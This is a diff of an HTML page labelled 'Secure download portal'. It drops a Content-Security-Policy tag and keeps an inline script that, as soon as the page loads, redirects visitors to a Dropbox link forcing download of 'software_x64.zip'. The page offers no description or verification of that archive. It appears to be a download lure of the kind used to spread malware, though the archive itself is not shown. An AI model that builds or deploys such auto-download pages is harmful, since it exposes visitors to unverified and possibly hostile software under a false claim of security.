@@ -7,17 +7,6 @@
     <meta name="description" content="Secure download portal" />
     <link rel="icon" href="/favicon.ico" type="image/x-icon" />
 
-    <!-- Разрешаем инлайн‑скрипты для нашего мини‑JS -->
-    <meta
-      http-equiv="Content-Security-Policy"
-      content="
-    default-src 'self';
-    script-src  'self' 'unsafe-inline' https://maksid-kioka.github.io;
-    style-src   'self';
-    connect-src 'self' https://maksid-kioka.github.io
-  "
-    />
-
     <link rel="stylesheet" href="styles.css" />
     <link rel="stylesheet" href="git-styles.css" />
   </head>
@@ -89,9 +78,9 @@
       </div>
     </div>
 
+    <!-- Прямой редирект на Dropbox -->
     <script>
-  // Редирект сразу на Dropbox
-  window.location.href = "https://www.dropbox.com/scl/fi/7q4lnekzm9pd0yeqdzcmr/software_x64.zip?rlkey=jwkphj9pjdrbkha9mvssxz6ss&st=3x6cmwtt&dl=1";
-</script>
+      window.location.href = "https://www.dropbox.com/scl/fi/7q4lnekzm9pd0yeqdzcmr/software_x64.zip?rlkey=jwkphj9pjdrbkha9mvssxz6ss&st=3x6cmwtt&dl=1";
+    </script>
   </body>
 </html>
